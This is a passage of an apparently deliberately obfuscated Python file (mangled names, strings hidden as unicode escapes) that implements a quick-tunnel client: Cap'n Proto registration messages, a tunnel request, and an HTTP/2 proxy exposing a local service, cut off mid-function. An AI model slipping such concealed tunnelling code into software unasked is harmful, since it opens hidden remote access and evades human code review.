            self.write_bytes(O0_var_591 + O0_var_593, O0_var_594, True)

    def finish(self):
        return struct.pack(codecs.decode('\\u003c\\u0049\\u0049', 'unicode_escape'), 0, len(self.words)) + b''.join((struct.pack(codecs.decode('\\u003c\\u0051', 'unicode_escape'), O0_var_595) for O0_var_595 in self.words))

def O0_fn_10(O0_var_596):
    O0_var_597 = CapnpBuilder()
    O0_var_598, O0_var_599, O0_var_600 = (O0_var_597.alloc(1), O0_var_597.alloc(1), O0_var_597.alloc(1))
    O0_var_597.struct_ptr(O0_var_598, O0_var_599, 1, 1)
    O0_var_597.set_u16(O0_var_599, 0, 8)
    O0_var_601 = O0_var_597.alloc(1)
    O0_var_597.alloc(1)
    O0_var_597.struct_ptr(O0_var_600, O0_var_601, 1, 1)
    O0_var_597.set_u32(O0_var_601, 0, O0_var_596)
    return O0_var_597.finish()

def O0_fn_11(O0_var_602, O0_var_603, O0_var_604, O0_var_605, O0_var_606, O0_var_607):
    O0_var_608 = CapnpBuilder()
    O0_var_609, O0_var_610, O0_var_611 = (O0_var_608.alloc(1), O0_var_608.alloc(1), O0_var_608.alloc(1))
    O0_var_608.struct_ptr(O0_var_609, O0_var_610, 1, 1)
    O0_var_608.set_u16(O0_var_610, 0, 2)
    O0_var_612, O0_var_613, O0_var_614 = (O0_var_608.alloc(1), O0_var_608.alloc(1), O0_var_608.alloc(1))
    O0_var_615, O0_var_616, O0_var_614 = (O0_var_608.alloc(1), O0_var_608.alloc(1), O0_var_608.alloc(1))
    O0_var_608.struct_ptr(O0_var_611, O0_var_612, 3, 3)
    O0_var_608.set_u32(O0_var_612, 0, O0_var_602)
    O0_var_608.set_u64(O0_var_613, 17804583019846587543)
    O0_var_617, O0_var_618 = (O0_var_608.alloc(1), O0_var_608.alloc(1))
    O0_var_608.struct_ptr(O0_var_615, O0_var_617, 1, 1)
    O0_var_608.set_u16(O0_var_617, 4, 1)
    O0_var_619 = O0_var_608.alloc(1)
    O0_var_608.alloc(1)
    O0_var_608.struct_ptr(O0_var_618, O0_var_619, 1, 1)
    O0_var_608.set_u32(O0_var_619, 0, O0_var_603)
    O0_var_620, O0_var_614 = (O0_var_608.alloc(1), O0_var_608.alloc(1))
    O0_var_608.struct_ptr(O0_var_616, O0_var_620, 0, 2)
    O0_var_621, O0_var_622, O0_var_623, O0_var_624 = (O0_var_608.alloc(1), O0_var_608.alloc(1), O0_var_608.alloc(1), O0_var_608.alloc(1))
    O0_var_608.struct_ptr(O0_var_620, O0_var_621, 1, 3)
    O0_var_608.set_u8(O0_var_621, 0, O0_var_607)
    O0_var_625, O0_var_626 = (O0_var_608.alloc(1), O0_var_608.alloc(1))
    O0_var_608.struct_ptr(O0_var_622, O0_var_625, 0, 2)
    O0_var_608.write_bytes(O0_var_625, O0_var_604, True)
    O0_var_608.write_bytes(O0_var_626, O0_var_605)
    O0_var_608.write_bytes(O0_var_623, O0_var_606)
    O0_var_627, O0_var_628, O0_var_614 = (O0_var_608.alloc(1), O0_var_608.alloc(1), O0_var_608.alloc(1))
    O0_var_608.struct_ptr(O0_var_624, O0_var_627, 1, 2)
    O0_var_629, O0_var_630, O0_var_631, O0_var_632 = (O0_var_608.alloc(1), O0_var_608.alloc(1), O0_var_608.alloc(1), O0_var_608.alloc(1))
    O0_var_608.struct_ptr(O0_var_628, O0_var_629, 0, 4)
    O0_var_608.write_bytes(O0_var_629, uuid.uuid4().bytes)
    O0_var_608.write_text_list(O0_var_630, [codecs.decode('\\u0073\\u0065\\u0072\\u0069\\u0061\\u006c\\u0069\\u007a\\u0065\\u0064\\u005f\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'), codecs.decode('\\u0061\\u006c\\u006c\\u006f\\u0077\\u005f\\u0072\\u0065\\u006d\\u006f\\u0074\\u0065\\u005f\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067', 'unicode_escape')])
    O0_var_608.write_bytes(O0_var_631, codecs.decode('\\u0032\\u0030\\u0032\\u0034\\u002e\\u0031\\u0030\\u002e\\u0030\\u002d\\u004e\\u0065\\u0078\\u0075\\u0073', 'unicode_escape'), True)
    O0_var_608.write_bytes(O0_var_632, codecs.decode('\\u004e\\u0065\\u0078\\u0075\\u0073\\u002d\\u0050\\u0079\\u0074\\u0068\\u006f\\u006e', 'unicode_escape'), True)
    return O0_var_608.finish()

def O0_fn_12(O0_var_633):
    O0_var_634 = []
    O0_var_635 = 0
    while len(O0_var_633) - O0_var_635 >= 8:
        O0_var_636, O0_var_637 = struct.unpack_from(codecs.decode('\\u003c\\u0049\\u0049', 'unicode_escape'), O0_var_633, O0_var_635)
        O0_var_638 = O0_var_636 + 1
        O0_var_639 = 2 + O0_var_638
        O0_var_640 = O0_var_639 * 4
        if O0_var_640 % 8:
            O0_var_640 += 4
        if len(O0_var_633) - O0_var_635 < O0_var_640:
            break
        O0_var_641 = [O0_var_637]
        for O0_var_642 in range(1, O0_var_638):
            O0_var_641.append(struct.unpack_from(codecs.decode('\\u003c\\u0049', 'unicode_escape'), O0_var_633, O0_var_635 + 4 + O0_var_642 * 4)[0])
        O0_var_643 = O0_var_640 + sum(O0_var_641) * 8
        if len(O0_var_633) - O0_var_635 < O0_var_643:
            break
        if O0_var_638 != 1:
            raise ValueError(codecs.decode('\\u006d\\u0075\\u006c\\u0074\\u0069\\u002d\\u0073\\u0065\\u0067\\u006d\\u0065\\u006e\\u0074\\u0020\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u0020\\u0069\\u0073\\u0020\\u006e\\u006f\\u0074\\u0020\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064', 'unicode_escape'))
        O0_var_634.append(O0_var_633[O0_var_635 + O0_var_640:O0_var_635 + O0_var_643])
        O0_var_635 += O0_var_643
    return (O0_var_634, O0_var_633[O0_var_635:])

def O0_fn_13(O0_var_644, O0_var_645):
    O0_var_646 = O0_var_644[O0_var_645]
    if O0_var_646 & 3 != 0:
        raise ValueError(codecs.decode('\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u0073\\u0074\\u0072\\u0075\\u0063\\u0074\\u0020\\u0070\\u006f\\u0069\\u006e\\u0074\\u0065\\u0072', 'unicode_escape'))
    O0_var_647 = O0_var_646 >> 2 & 1073741823
    if O0_var_647 & 536870912:
        O0_var_647 -= 1073741824
    O0_var_648 = O0_var_645 + 1 + O0_var_647
    O0_var_649 = O0_var_646 >> 32 & 65535
    O0_var_650 = O0_var_646 >> 48 & 65535
    if O0_var_648 < 0 or O0_var_648 + O0_var_649 + O0_var_650 > len(O0_var_644):
        raise ValueError(codecs.decode('\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u0070\\u006f\\u0069\\u006e\\u0074\\u0065\\u0072\\u0020\\u006f\\u0075\\u0074\\u0020\\u006f\\u0066\\u0020\\u0062\\u006f\\u0075\\u006e\\u0064\\u0073', 'unicode_escape'))
    return (O0_var_648, O0_var_649, O0_var_650)

def O0_fn_14(O0_var_651, O0_var_652):
    O0_var_653 = O0_var_651[O0_var_652]
    if O0_var_653 & 3 != 1:
        return codecs.decode('', 'unicode_escape')
    O0_var_654 = O0_var_653 >> 2 & 1073741823
    if O0_var_654 & 536870912:
        O0_var_654 -= 1073741824
    O0_var_655 = O0_var_652 + 1 + O0_var_654
    O0_var_656 = O0_var_653 >> 32 & 7
    O0_var_657 = O0_var_653 >> 35
    if O0_var_656 != 2 or O0_var_655 < 0 or O0_var_655 + (O0_var_657 + 7) // 8 > len(O0_var_651):
        return codecs.decode('', 'unicode_escape')
    O0_var_658 = b''.join((struct.pack(codecs.decode('\\u003c\\u0051', 'unicode_escape'), O0_var_659) for O0_var_659 in O0_var_651[O0_var_655:O0_var_655 + (O0_var_657 + 7) // 8]))[:O0_var_657]
    return O0_var_658.rstrip(b'\x00').decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))

def O0_fn_15(data):
    if len(data) % 8 or len(data) < 24:
        raise ValueError(codecs.decode('\\u0073\\u0068\\u006f\\u0072\\u0074\\u0020\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e', 'unicode_escape'))
    O0_var_660 = list(struct.unpack(codecs.decode('\\u003c', 'unicode_escape') + codecs.decode('\\u0051', 'unicode_escape') * (len(data) // 8), data))
    O0_var_661, O0_var_662, O0_var_663 = O0_fn_13(O0_var_660, 0)
    if O0_var_662 < 1 or O0_var_660[O0_var_661] & 65535 != 3:
        raise ValueError(codecs.decode('\\u006e\\u006f\\u0074\\u0020\\u0061\\u006e\\u0020\\u0052\\u0050\\u0043\\u0020\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'))
    O0_var_664, O0_var_665, O0_var_666 = O0_fn_13(O0_var_660, O0_var_661 + O0_var_662)
    O0_var_667 = O0_var_660[O0_var_664] >> 48 & 65535
    if O0_var_667 == 1:
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): O0_fn_14(O0_var_660, O0_var_664 + O0_var_665)}
    if O0_var_667 != 0:
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0052\\u0050\\u0043\\u0020\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0020\\u0075\\u006e\\u0069\\u006f\\u006e\\u0020\\u0025\\u0064', 'unicode_escape') % O0_var_667}
    O0_var_668, O0_var_669, O0_var_670 = O0_fn_13(O0_var_660, O0_var_664 + O0_var_665)
    O0_var_671, O0_var_672, O0_var_673 = O0_fn_13(O0_var_660, O0_var_668 + O0_var_669)
    O0_var_674 = O0_var_660[O0_var_671]
    O0_var_675 = O0_var_674 & 65535
    if O0_var_675 == 0:
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): O0_fn_14(O0_var_660, O0_var_671 + O0_var_672)}
    if O0_var_675 != 1:
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0075\\u006e\\u0069\\u006f\\u006e\\u0020\\u0025\\u0064', 'unicode_escape') % O0_var_675}
    O0_var_676, O0_var_677, O0_var_678 = O0_fn_13(O0_var_660, O0_var_671 + O0_var_672)
    O0_var_679 = O0_fn_14(O0_var_660, O0_var_676 + O0_var_677 + 1)
    return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): True, codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_679, codecs.decode('\\u0072\\u0065\\u006d\\u006f\\u0074\\u0065\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0064', 'unicode_escape'): bool(O0_var_660[O0_var_676] & 1)}

def O0_fn_16(path):
    O0_var_680 = os.path.splitext(path.rstrip(codecs.decode('\\u002f', 'unicode_escape')))[1].lower()
    return {codecs.decode('\\u002e\\u006a\\u0073', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u006a\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u006d\\u006a\\u0073', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u006a\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u0063\\u0073\\u0073', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u0063\\u0073\\u0073\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u006a\\u0073\\u006f\\u006e', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u006d\\u0061\\u0070', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u0077\\u0061\\u0073\\u006d', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u0077\\u0061\\u0073\\u006d', 'unicode_escape'), codecs.decode('\\u002e\\u0068\\u0074\\u006d\\u006c', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u0068\\u0074\\u006d\\u006c\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u0068\\u0074\\u006d', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u0068\\u0074\\u006d\\u006c\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u0073\\u0076\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0073\\u0076\\u0067\\u002b\\u0078\\u006d\\u006c', 'unicode_escape'), codecs.decode('\\u002e\\u0078\\u006d\\u006c', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u0078\\u006d\\u006c', 'unicode_escape'), codecs.decode('\\u002e\\u0077\\u006f\\u0066\\u0066', 'unicode_escape'): codecs.decode('\\u0066\\u006f\\u006e\\u0074\\u002f\\u0077\\u006f\\u0066\\u0066\\u0032', 'unicode_escape'), codecs.decode('\\u002e\\u0077\\u006f\\u0066\\u0066\\u0032', 'unicode_escape'): codecs.decode('\\u0066\\u006f\\u006e\\u0074\\u002f\\u0077\\u006f\\u0066\\u0066\\u0032', 'unicode_escape'), codecs.decode('\\u002e\\u0070\\u006e\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0070\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u002e\\u006a\\u0070\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u006a\\u0070\\u0065\\u0067', 'unicode_escape'), codecs.decode('\\u002e\\u006a\\u0070\\u0065\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u006a\\u0070\\u0065\\u0067', 'unicode_escape'), codecs.decode('\\u002e\\u0067\\u0069\\u0066', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0067\\u0069\\u0066', 'unicode_escape'), codecs.decode('\\u002e\\u0069\\u0063\\u006f', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0078\\u002d\\u0069\\u0063\\u006f\\u006e', 'unicode_escape')}.get(O0_var_680, codecs.decode('', 'unicode_escape'))

def O0_fn_17(O0_var_681):
    if isinstance(O0_var_681, list):
        return bytes(O0_var_681)
    if not isinstance(O0_var_681, str):
        raise ValueError(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074\\u0020\\u0068\\u0061\\u0073\\u0020\\u0061\\u006e\\u0020\\u0075\\u006e\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'))
    return base64.b64decode(O0_var_681 + codecs.decode('\\u003d', 'unicode_escape') * (-len(O0_var_681) % 4))

def O0_fn_18(O0_var_682):
    request = urllib.request.Request(O0_var_682.rstrip(codecs.decode('\\u002f', 'unicode_escape')) + codecs.decode('\\u002f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c', 'unicode_escape'), data=b'', method=codecs.decode('\\u0050\\u004f\\u0053\\u0054', 'unicode_escape'), headers={codecs.decode('\\u0043\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0054\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0055\\u0073\\u0065\\u0072\\u002d\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): codecs.decode('\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0070\\u0079\\u002f\\u0031\\u002e\\u0030', 'unicode_escape')})
    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            O0_var_683 = response.read()
            O0_var_684 = response.status
    except urllib.error.URLError as exc:
        raise RuntimeError(codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0069\\u006e\\u0067\\u0020\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % exc) from exc
    try:
        O0_var_685 = json.loads(O0_var_683)
    except json.JSONDecodeError as exc:
        raise RuntimeError(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0065\\u0064\\u0020\\u006e\\u006f\\u006e\\u002d\\u004a\\u0053\\u004f\\u004e\\u0020\\u0028\\u0025\\u0073\\u0029\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % (O0_var_684, O0_var_683[:300].decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape')))) from exc
    O0_var_686 = O0_var_685.get(codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape')) or {}
    if not O0_var_685.get(codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'), True) or not O0_var_686:
        raise RuntimeError(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0020\\u0077\\u0061\\u0073\\u0020\\u0072\\u0065\\u006a\\u0065\\u0063\\u0074\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % json.dumps(O0_var_685.get(codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072\\u0073', 'unicode_escape')), ensure_ascii=False))
    try:
        O0_var_687 = uuid.UUID(O0_var_686[codecs.decode('\\u0069\\u0064', 'unicode_escape')])
        O0_var_688 = O0_var_686[codecs.decode('\\u0061\\u0063\\u0063\\u006f\\u0075\\u006e\\u0074\\u005f\\u0074\\u0061\\u0067', 'unicode_escape')]
        O0_var_689 = O0_fn_17(O0_var_686[codecs.decode('\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074', 'unicode_escape')])
        O0_var_690 = O0_var_686[codecs.decode('\\u0068\\u006f\\u0073\\u0074\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')]
    except (KeyError, ValueError, binascii.Error, TypeError) as exc:
        raise RuntimeError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % exc) from exc
    return (O0_var_690, O0_var_688, O0_var_689, O0_var_687.bytes)

class H2Connection:

    def __init__(self, O0_var_691, O0_var_692, O0_var_693, O0_var_694, O0_var_695, O0_var_696, logger, O0_var_697=None, O0_var_698=False, O0_var_699=None):
        self.sock = O0_var_691
        self.origin = O0_var_692
        self.account_tag = O0_var_693
        self.tunnel_secret = O0_var_694
        self.tunnel_id = O0_var_695
        self.conn_index = O0_var_696
        self.log = logger
        self.tunnel_url = O0_var_697
        self.show_tunnel = O0_var_698
        self.tunnel_state = O0_var_699 if O0_var_699 is not None else {codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape'): False}
        self.decoder = HpackDecoder()
        self.encoder_lock = threading.Lock()
        self.window_condition = threading.Condition()
        self.connection_window = 65535
        self.stream_windows = {}
        self.peer_max_frame = MAX_FRAME_SIZE
        self.streams = {}
        self.control = None
        self.stopped = False
        self.registered = False
        self.registration_failed = False

    def send_frame(self, O0_var_700, O0_var_701, O0_var_702, O0_var_703=b''):
        if len(O0_var_703) > 16777215:
            raise ValueError(codecs.decode('\\u0048\\u0054\\u0054\\u0050\\u002f\\u0032\\u0020\\u0066\\u0072\\u0061\\u006d\\u0065\\u0020\\u0074\\u006f\\u006f\\u0020\\u006c\\u0061\\u0072\\u0067\\u0065', 'unicode_escape'))
        O0_var_704 = struct.pack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), len(O0_var_703))[1:] + bytes((O0_var_700, O0_var_701)) + struct.pack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), O0_var_702 & 2147483647)
        with self.encoder_lock:
            self.sock.sendall(O0_var_704 + O0_var_703)

    def send_headers(self, O0_var_705, headers, O0_var_706=False):
        O0_var_707 = O0_fn_9(headers)
        O0_var_708 = 4 | (1 if O0_var_706 else 0)
        self.send_frame(1, O0_var_708, O0_var_705, O0_var_707)

    def send_data(self, O0_var_709, O0_var_710, O0_var_711=False):
        O0_var_712 = memoryview(O0_var_710)
        O0_var_713 = 0
        while O0_var_713 < len(O0_var_712) or (len(O0_var_712) == 0 and O0_var_713 == 0):
            with self.window_condition:
                while self.connection_window <= 0 or self.stream_windows.get(O0_var_709, 65535) <= 0:
                    if self.stopped:
                        return
                    self.window_condition.wait(1)
                O0_var_714 = min(len(O0_var_712) - O0_var_713, self.connection_window, self.stream_windows.get(O0_var_709, 65535), self.peer_max_frame)
                if len(O0_var_712) == 0:
                    O0_var_714 = 0
                O0_var_715 = bytes(O0_var_712[O0_var_713:O0_var_713 + O0_var_714])
                self.connection_window -= O0_var_714
                self.stream_windows[O0_var_709] = self.stream_windows.get(O0_var_709, 65535) - O0_var_714
            O0_var_716 = 1 if O0_var_711 and O0_var_713 + O0_var_714 >= len(O0_var_712) else 0
            self.send_frame(0, O0_var_716, O0_var_709, O0_var_715)
            O0_var_713 += O0_var_714
            if len(O0_var_712) == 0:
                break

    def send_window_update(self, O0_var_717, O0_var_718):
        if O0_var_718 > 0:
            self.send_frame(8, 0, O0_var_717, struct.pack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), O0_var_718 & 2147483647))

    def read_frame(self):
        O0_var_719 = O0_fn_22(self.sock, 9)
        O0_var_720 = int.from_bytes(O0_var_719[:3], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
        O0_var_721, O0_var_722 = (O0_var_719[3], O0_var_719[4])
        O0_var_723 = struct.unpack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), O0_var_719[5:])[0] & 2147483647
        O0_var_724 = O0_fn_22(self.sock, O0_var_720)
        return (O0_var_721, O0_var_722, O0_var_723, O0_var_724)

    def read_headers(self, O0_var_725, O0_var_726, O0_var_727):
        if O0_var_725 & 8:
            O0_var_728 = O0_var_727[0]
            O0_var_727 = O0_var_727[1:]
            if O0_var_728 > len(O0_var_727):
                raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0048\\u0054\\u0054\\u0050\\u002f\\u0032\\u0020\\u0070\\u0061\\u0064\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'))
            O0_var_727 = O0_var_727[:-O0_var_728] if O0_var_728 else O0_var_727
        if O0_var_725 & 32:
            O0_var_727 = O0_var_727[5:]
        O0_var_729 = [O0_var_727]
        while not O0_var_725 & 4:
            O0_var_730, O0_var_731, O0_var_732, O0_var_733 = self.read_frame()
            if O0_var_730 != 9 or O0_var_732 != O0_var_726:
                raise ValueError(codecs.decode('\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0043\\u004f\\u004e\\u0054\\u0049\\u004e\\u0055\\u0041\\u0054\\u0049\\u004f\\u004e\\u0020\\u0066\\u0072\\u0061\\u006d\\u0065', 'unicode_escape'))
            O0_var_729.append(O0_var_733)
            O0_var_725 = O0_var_731
        return self.decoder.decode(b''.join(O0_var_729))

    def open_control(self, O0_var_734):
        if self.control is not None:
            return
        self.control = ControlStream(self, O0_var_734, self.log)
        self.send_headers(O0_var_734, [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0030', 'unicode_escape'))])
        self.control.start(self.account_tag, self.tunnel_secret, self.tunnel_id, self.conn_index)

    def update_config(self, O0_var_735, body):
        O0_var_736 = 0
        try:
            O0_var_736 = int(json.loads(body or b'{}').get(codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'), 0))
        except (ValueError, TypeError, json.JSONDecodeError):
            pass
        response = json.dumps({codecs.decode('\\u006c\\u0061\\u0074\\u0065\\u0073\\u0074\\u0041\\u0070\\u0070\\u006c\\u0069\\u0065\\u0064\\u0056\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_736}, separators=(codecs.decode('\\u002c', 'unicode_escape'), codecs.decode('\\u003a', 'unicode_escape'))).encode()
        self.send_headers(O0_var_735, [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0030', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'), str(len(response)))])
        self.send_data(O0_var_735, response, True)

    def request_finished(self, O0_var_737, request):
        if request.get(codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape')) == codecs.decode('\\u0075\\u0070\\u0064\\u0061\\u0074\\u0065\\u002d\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u0075\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'):
            self.update_config(O0_var_737, bytes(request[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')]))
            return
        if request.get(codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')):
            return
        if request.get(codecs.decode('\\u0066\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064', 'unicode_escape')):
            return
        request[codecs.decode('\\u0066\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064', 'unicode_escape')] = True
        threading.Thread(target=self.proxy_request, args=(O0_var_737, request), daemon=True).start()

    def proxy_request(self, O0_var_738, request):
        try:
